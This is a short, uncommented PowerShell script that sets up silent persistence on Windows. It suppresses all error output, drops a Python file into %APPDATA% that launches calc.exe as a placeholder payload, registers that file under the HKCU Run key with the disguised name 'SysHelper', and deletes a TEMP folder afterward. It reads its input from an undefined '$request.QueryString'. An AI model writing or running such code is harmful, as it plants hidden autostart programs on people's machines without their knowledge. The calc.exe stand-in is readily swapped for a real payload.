$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'

function Create-PythonScript {
    param($q)
    
    $scriptPath = "$env:APPDATA\runner.py"
    
    $code = @"
import subprocess
subprocess.Popen("calc.exe", shell=True)
"@
    
    $code | Out-File -FilePath $scriptPath -Encoding UTF8
    return $scriptPath
}

function Add-ToStartup {
    param($pythonExe, $scriptPath)
    
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "SysHelper"
    $command = "`"$pythonExe`" `"$scriptPath`""
    
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name $regName -Value $command
}

try {
    $pythonExe = $request.QueryString['q']
    
    if ($pythonExe) {
        Write-Output "Received Python path: $pythonExe"
        
        if (Test-Path $pythonExe) {
            $scriptPath = Create-PythonScript -q $pythonExe
            Add-ToStartup -pythonExe $pythonExe -scriptPath $scriptPath
            
            Write-Output "Successfully configured startup with: $pythonExe"
        } else {
            Write-Output "Python executable not found: $pythonExe"
        }
    } else {
        Write-Output "No Python path received"
    }
}
catch {
    Write-Output "Error: $($_.Exception.Message)"
}

Remove-Item "$env:TEMP\PythonEmbed" -Force -Recurse -ErrorAction SilentlyContinue